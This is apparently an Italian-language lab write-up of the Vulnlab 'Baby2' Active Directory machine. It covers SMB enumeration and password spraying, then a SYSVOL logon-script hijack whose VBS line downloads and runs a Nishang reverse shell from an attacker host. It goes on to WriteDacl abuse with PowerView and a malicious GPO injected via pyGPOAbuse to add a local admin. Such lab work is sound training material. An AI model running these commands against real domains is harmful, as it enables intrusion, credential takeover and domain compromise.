+++
date = '2026-07-07T18:17:42+02:00'
draft = false
title = 'BabyTwo Writeup IT'
+++
**Name**: **`joy.scd01`**

**Date**: **`09/06/2026`**

![BabyTwo.png](/images/imgs_babytwo/BabyTwo.png)

---
# Introduzione

**_Baby2_** è un ambiente **Active Directory** di livello **Medium** creato da **Vulnlab**. Tratta fondamenti di **AD**, introducendo percorsi di attacco complessi che coinvolgono risorse condivise e lo sfruttamento delle **Group Policy Object** (**GPO**).

Il punto di accesso iniziale prevede l'enumerazione **SMB** anonima per estrarre una lista di utenti, seguita da un attacco di **password spraying**. Trovando credenziali valide per un utente con permessi di scrittura sulla share **SYSVOL**, ho modificato un logon script per eseguire una reverse shell, attivata dal login di un altro utente.

Per la privilege escalation, **BloodHound** ha rivelato un privilegio **`WriteDacl`** sull'account **GPOADM**, di cui ho abusato per resettarne la password. Infine, sfruttando i diritti **`GenericAll`** di **GPOADM** su una **GPO**, ho iniettato una policy malevola per aggiungere un nuovo **amministratore** locale, compromettendo interamente il dominio.

---
# Tecniche Utilizzate
- **Enumerazione SMB anonima**

- **Password Spraying**

- **Manipolazione del Logon Script in SYSVOL (VBS)**

- **BloodHound Harvesting & Enumerazione**

- **Abuso delle DACL (WriteDacl) via PowerView**

- **Abuso GPO via pygpoabuse**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- -Pn baby2
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49673/tcp open  unknown
49677/tcp open  unknown
58230/tcp open  unknown
58237/tcp open  unknown
61726/tcp open  unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV -Pn baby2
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-07 13:04:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-07T13:05:30+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2026-07-06T13:02:09
|_Not valid after:  2027-01-05T13:02:09
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-07T13:04:50+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-07T13:04:54
|_  start_date: N/A
```

**Porte Aperte**:

- **53**/tcp - DNS

- **88**/tcp - Kerberos

- **135**/tcp - MSRPC

- **139**/tcp - netbios-ssn

- **389**/tcp - LDAP

- **445**/tcp - microsoft-ds (SMB)

- **464**/tcp - kpasswd5

- **593**/tcp - ncacn_http

- **636**/tcp - ssl/ldap

- **3268**/tcp - LDAP Global Catalog

- **3269**/tcp - ssl/ldap Global Catalog

- **3389**/tcp - RDP

Ho aggiunto **`baby2.vl`** e **`dc.baby2.vl`** al mio file **`/etc/hosts`**.

## Enumerazione SMB & Information Gathering

Ho iniziato enumerando le share **SMB**, controllando se l'accesso anonimo fosse consentito utilizzando **NetExec**:

```bash
nxc smb baby2.vl -u 'Guest' -p '' --shares
```

![smbanon.png](/images/imgs_babytwo/smbanon.png)

L'output ha mostrato l'accesso a un paio di share non di default molto interessanti: **`apps`** e **`homes`**.

Mi sono connesso alla share **`apps`** usando **smbclient**:

```bash
smbclient //baby2.vl/apps -U 'Guest'
```

![smbclient.png](/images/imgs_babytwo/smbclient.png)

Navigando all'interno della cartella **`dev`**, ho trovato un file **`CHANGELOG`** e un collegamento chiamato **`login.vbs.lnk`**. Ho scaricato tutto sulla mia macchina locale.

L'estrazione delle **strings** dal file **`.lnk`** ha confermato l'esistenza di un logon script in **Visual Basic** all'interno della share **SYSVOL**.

![loginvbs.png](/images/imgs_babytwo/loginvbs.png)

Successivamente, ho fatto l'accesso alla share **`homes`**:

```bash
smbclient //baby2.vl/homes -U 'Guest'
```

Questa share conteneva una directory per ogni utente nel dominio.

![users.png](/images/imgs_babytwo/users.png)

Ho copiato l'output e utilizzato **bash** per parsare gli username all'interno di una wordlist pulita:

```bash
cat users.txt | cut -d " " -f3 | tee users_cleaned.txt
```

![userscleaned.png](/images/imgs_babytwo/userscleaned.png)

---
# Accesso Iniziale | Manipolazione Logon Script → VBS Reverse Shell

Con una lista di utenti valida, ho eseguito un attacco di **password spraying**.

**Nota**: _Una pratica molto comune (e pessima) nelle configurazioni iniziali di **AD** è che gli utenti abbiano la propria password impostata in modo identico all'username._

```bash
nxc smb baby2.vl -u users_cleaned.txt -p users_cleaned.txt --continue-on-success
```

![continueonsuccess.png](/images/imgs_babytwo/continueonsuccess.png)

Lo spray ha restituito un hit positivo:

```text
Carl.Moore:Carl.Moore
```

Ho validato queste credenziali con la share **SYSVOL**, che contiene i logon script e le group policy del dominio:

```bash
nxc smb baby2.vl -u 'Carl.Moore' -p 'Carl.Moore'

smbclient //10.10.122.180/SYSVOL -U 'baby2.vl/Carl.Moore%Carl.Moore'
```

![smbcarl.png](/images/imgs_babytwo/smbcarl.png)

![smbsysvol.png](/images/imgs_babytwo/smbsysvol.png)

Navigando nella directory **`/baby2.vl/scripts`**, ho trovato l'effettivo file **`login.vbs`** e l'ho scaricato. Cosa fondamentale, il mio utente corrente (**Carl.Moore**) aveva permessi di scrittura in questa directory.

- **`login.vbs`**:

![catloginvbs.png](/images/imgs_babytwo/catloginvbs.png)

**Nota**: _Modificare un logon script all'interno di **SYSVOL** è una classica tecnica **Red Team** di persistenza e lateral movement. Quando un qualsiasi utente nel dominio effettua il login, il **KDC** istruisce la sua macchina a recuperare ed eseguire questo script. Sostituendolo con un payload malevolo, possiamo dirottare la sessione del prossimo utente che si autentica._

Ho preparato un payload per una reverse shell in **PowerShell** di **Nishang** (**`Invoke-PowerShellTcp.ps1`**) e ho appeso la chiamata di esecuzione in fondo al file:

```bash
echo "Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 22667" >> Invoke-PowerShellTcp.ps1

mv Invoke-PowerShellTcp.ps1 stars.ps1
```

Non conoscevo la sintassi esatta in **VBScript** per eseguire comandi esterni, quindi ho fatto una rapida ricerca su **Google** per "**vbs revshell**". Ho prelevato il metodo **`CreateObject("WScript.Shell").Run`** e modificato il file **`login.vbs`** per recuperare ed eseguire il mio script **PowerShell** interamente in memoria:

```VBScript
CreateObject("WScript.Shell").Run "powershell -ep bypass -w hidden IEX(New-Object System.Net.Webclient).DownloadString('http://<ATTACKER_IP>:8000/stars.ps1')"
```

Ho hostato il payload **PowerShell** su un server **HTTP** locale (**`python3 -m http.server`**), avviato un listener **Netcat** sulla porta 22667 e ricaricato il **`login.vbs`** malevolo su **SYSVOL**:

```bash
smbclient //baby2.vl/SYSVOL -U 'Carl.Moore'
cd /baby2.vl/scripts
del login.vbs
put login.vbs
```

Dopo una breve attesa, un utente ha effettuato l'accesso, ha attivato lo script e ho ottenuto una shell come **`amelia.griffiths`**.

![initialaccess.png](/images/imgs_babytwo/initialaccess.png)

In **`C:\Users\amelia.griffiths\Desktop`** era presente la **user flag**.

![userflag.png](/images/imgs_babytwo/userflag.png)

---
# Privilege Escalation | WriteDacl → GPO Abuse

Ora operando come **`amelia.griffiths`**, ho iniziato la mia enumerazione interna dell'**Active Directory** utilizzando **BloodHound**:

```bash
bloodhound-python -u 'Carl.Moore' -p 'Carl.Moore' -ns 10.129.234.72 -d baby2.vl -c all --zip
```

![harvesting.png](/images/imgs_babytwo/harvesting.png)

![ingest.png](/images/imgs_babytwo/ingest.png)

Dopo aver importato il file zip nella **GUI** di **BloodHound**, ho impostato **`AMELIA.GRIFFITHS`** come nodo di partenza. Analizzando l'**Outbound Object Control**, ho scoperto che questo utente (o il suo gruppo, **legacy**) aveva permessi di **`WriteDacl`** sull'account **GPOADM**.

![hound1.png](/images/imgs_babytwo/hound1.png)

**Nota**: _Avere **`WriteDacl`** significa che l'attaccante può modificare i permessi (**Access Control List**) dell'oggetto bersaglio. Questo ci permette di garantirci i privilegi di **`GenericAll`** (**Controllo Completo**), che include intrinsecamente il diritto di resettare la password del bersaglio senza conoscere quella vecchia._

Per sfruttare la cosa, ho scaricato **PowerView** sulla macchina bersaglio e importato il modulo:

```bash
iwr -uri http://<ATTACKER_IP>:8000/PowerView.ps1 -Outfile PowerView.ps1
```

![pvdownload.png](/images/imgs_babytwo/pvdownload.png)

Utilizzando **PowerView**, ho garantito al mio principal (**legacy**) i pieni diritti su **GPOADM** e successivamente ne ho resettato la password:

```powershell
import-module ./PowerView.ps1

Add-DomainObjectAcl -TargetIdentity "GPOADM" -PrincipalIdentity legacy -Domain baby2.vl -Rights All -Verbose

$UserPassword = ConvertTo-SecureString 'fall123!' -AsPlainText -Force

Set-DomainUserPassword -Identity "GPOADM" -AccountPassword $UserPassword
```

![writedacl.png](/images/imgs_babytwo/writedacl.png)

## Iniezione di GPO Malevola

Controllando di nuovo **BloodHound**, ho verificato quali privilegi possedesse l'account **GPOADM**. L'account aveva diritti di **`GenericAll`** su una specifica **Group Policy Object** (**GPO**).

![hound2.png](/images/imgs_babytwo/hound2.png)

**Nota**: _Con **`GenericAll`** su una **GPO**, un attaccante può modificare la policy per eseguire comandi arbitrari, creare scheduled task o aggiungere utenti locali su tutte le macchine a cui la policy è applicata (solitamente **Domain Controller** o intere **OU**)._

Per weaponizzare questo vettore di attacco, ho utilizzato **pygpoabuse**, uno strumento esterno in **Python** progettato specificamente per questo scopo.

![gpoabusehint.png](/images/imgs_babytwo/gpoabusehint.png)

Ho clonato la repository:

- https://github.com/Hackndo/pyGPOAbuse

Ho preparato un ambiente virtuale e lanciato l'exploit:

```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git && cd pyGPOAbuse

python3 -m venv venv && . venv/bin/activate

pip3 install -r requirements.txt

python3 pygpoabuse.py 'baby2.vl/gpoadm:fall123!' -gpo-id '<GPO_ID>' -f
```

![gpoid.png](/images/imgs_babytwo/gpoid.png)

Lo script ha iniettato con successo una task all'interno della **GPO** che crea un nuovo **amministratore** locale chiamato **john** con la password **H4x00r123..**

![pygpoabuse.png](/images/imgs_babytwo/pygpoabuse.png)

Inizialmente ho provato a validare le nuove credenziali con **NetExec**, ma l'autenticazione ha fallito.

**Nota**: _Le **Group Policy** non si applicano istantaneamente nel dominio. Di default, si aggiornano in background ogni 90 minuti (con un offset casuale). L'account appena creato non esisterà effettivamente sulla macchina bersaglio finché non recepirà la policy aggiornata._

```bash
nxc winrm 10.10.122.180 -u 'john' -p 'H4x00r123..'
```

Quindi, dalla mia shell esistente come **`amelia.griffiths`**, ho forzato manualmente l'aggiornamento delle group policy:

```powershell
gpupdate /force
```

Una volta completato l'aggiornamento della policy, l'account **john** è stato correttamente validato.

```bash
nxc winrm 10.10.122.180 -u 'john' -p 'H4x00r123..'
```

![pwned.png](/images/imgs_babytwo/pwned.png)

Mi sono quindi connesso tramite **Evil-WinRM**:

```bash
evil-winrm -i baby2.vl -u 'john' -p 'H4x00r123..'
```

Sistema Compromesso.

Nel Desktop dell'**Administrator** era presente la **root flag**.

![rootflag.png](/images/imgs_babytwo/rootflag.png)

---
# Considerazioni Finali

**_Baby2_** è un ambiente **Active Directory** assolutamente istruttivo che fa da ponte perfetto tra l'enumerazione di base e l'exploitation avanzata del dominio.

La fase di accesso iniziale è altamente realistica: policy delle password deboli combinate a permessi di scrittura eccessivamente permissivi su **SYSVOL** creano una combinazione letale che si trova fin troppo spesso all'interno delle reti aziendali.

Il percorso di privilege escalation costringe a comprendere le dinamiche interne delle **Access Control List**. Il passaggio da un abuso di **`WriteDacl`** all'abuso di una **GPO** rende questo box ottimo per testare le metodologie richieste da certificazioni come l'**OSCP** e il **CRTP**.

**Fonti**:

- **Nishang Reverse Shells | https://github.com/samratashok/nishang**

- **PowerView (PowerSploit) | https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon**

- **pygpoabuse | https://github.com/Hackndo/pygpoabuse**

- **Abusing GPOs (Hackndo) | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse**